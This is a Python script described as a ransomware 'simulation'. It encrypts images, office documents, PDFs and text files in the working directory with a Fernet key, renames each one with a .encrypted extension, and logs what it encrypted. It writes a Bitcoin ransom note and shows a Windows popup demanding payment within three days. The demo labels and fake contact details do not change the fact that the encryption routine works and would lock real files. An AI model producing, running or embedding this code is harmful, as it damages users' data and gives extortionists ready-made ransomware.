from cryptography.fernet import Fernet
import base64
import os
import csv
import ctypes
import time
import random
from datetime import datetime

# Constants for ransomware simulation
RANSOM_AMOUNT = random.randint(500, 2000)
BITCOIN_ADDRESS = "1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX"  # Fake address for demo
EMAIL_CONTACT = "recovery@darkwebfake.com"  # Fake email for demo
COUNTDOWN_DAYS = 3

# Generate a unique identifier for this victim
VICTIM_ID = Fernet.generate_key()[:8].hex()

def generate_private_key():
    """Generate and save encryption key with additional metadata"""
    key = Fernet.generate_key()
    with open("secret.key", "wb") as key_file:
        key_file.write(key)
    
    # Create ransom note with victim-specific details
    with open("READ_ME_FOR_DECRYPT.txt", "w") as ransom_note:
        ransom_note.write(f"""
=== YOUR FILES HAVE BEEN ENCRYPTED ===

What happened?
All your important files (documents, images, databases, etc.) have been encrypted.
The only way to recover your files is to pay the ransom.

Victim ID: {VICTIM_ID}
Encryption date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

What do I do now?
1. You must pay ${RANSOM_AMOUNT} in Bitcoin to: {BITCOIN_ADDRESS}
2. After payment, email us at {EMAIL_CONTACT} with your Victim ID
3. You will receive the decryption tool

WARNING:
- Do NOT modify or delete any encrypted files
- Do NOT attempt decryption yourself
- You have {COUNTDOWN_DAYS} days to pay before the price doubles

=== THIS IS YOUR LAST CHANCE TO RECOVER FILES ===
""")

def load_key():
    """Load the encryption key with error handling"""
    try:
        return open("secret.key", "rb").read()
    except FileNotFoundError:
        print("Error: Encryption key not found!")
        return None

def encrypt_files():
    """Encrypt files with progress tracking"""
    key = load_key()
    if not key:
        return
    
    f = Fernet(key)
    encrypted_count = 0
    
    # Create a CSV log of encrypted files
    with open("encrypted_files_log.csv", "w", newline='') as log_file:
        csv_writer = csv.writer(log_file)
        csv_writer.writerow(["Original Filename", "Encrypted Filename", "File Type", "Size (KB)", "Encryption Time"])
        
        for filename in os.listdir():
            if (filename.endswith((".jpg", ".jpeg", ".png", ".docx", ".doc",".xlsx", ".xls", ".pptx", ".ppt", ".pdf", ".txt")) and filename != "READ_ME_FOR_DECRYPT.txt"):
                try:
                    file_stats = os.stat(filename)
                    start_time = time.time()
                    
                    with open(filename, "rb") as file:
                        original_data = file.read()
                    
                    # Double encryption for demonstration
                    encrypted_data = f.encrypt(original_data)
                    encrypted_data = base64.b64encode(encrypted_data)
                    
                    # Change file extension to mark as encrypted
                    new_filename = f"{filename}.encrypted"
                    os.rename(filename, new_filename)
                    
                    with open(new_filename, "wb") as file:
                        file.write(encrypted_data)
                    
                    encryption_time = time.time() - start_time
                    csv_writer.writerow([
                        filename,
                        new_filename,
                        os.path.splitext(filename)[1],
                        round(file_stats.st_size / 1024, 2),
                        round(encryption_time, 2)
                    ])
                    encrypted_count += 1
                    
                except Exception as e:
                    print(f"Error encrypting {filename}: {str(e)}")
    
    return encrypted_count

def show_ransom_message():
    """Display ransom message to user"""
    message = f"""
    !!! WARNING !!!
    
    Your computer has been locked and your files encrypted!
    
    To recover your files, you must pay ${RANSOM_AMOUNT} in Bitcoin.
    Send payment to: {BITCOIN_ADDRESS}
    
    After payment, email {EMAIL_CONTACT} with your Victim ID: {VICTIM_ID}
    
    You have {COUNTDOWN_DAYS} days to comply before your files are permanently deleted.
    
    Instructions are in READ_ME_FOR_DECRYPT.txt on your desktop.
    """
    
    # Show popup message
    ctypes.windll.user32.MessageBoxW(0, message, "YOUR FILES ARE ENCRYPTED", 0x40)
    
    # Open ransom note
    os.system("start READ_ME_FOR_DECRYPT.txt")

def main():
    """Main ransomware simulation function"""
    print("[+] Starting ransomware simulation...")
    generate_private_key()
    encrypted_count = encrypt_files()
    
    if encrypted_count > 0:
        print(f"[+] Successfully encrypted {encrypted_count} files")
        show_ransom_message()
        
        # Create fake countdown timer (for demo purposes)
        with open("countdown.txt", "w") as f:
            f.write(f"Time remaining: {COUNTDOWN_DAYS} days 23:59:59")
    else:
        print("[-] No files were encrypted")

if __name__ == "__main__":
    main()
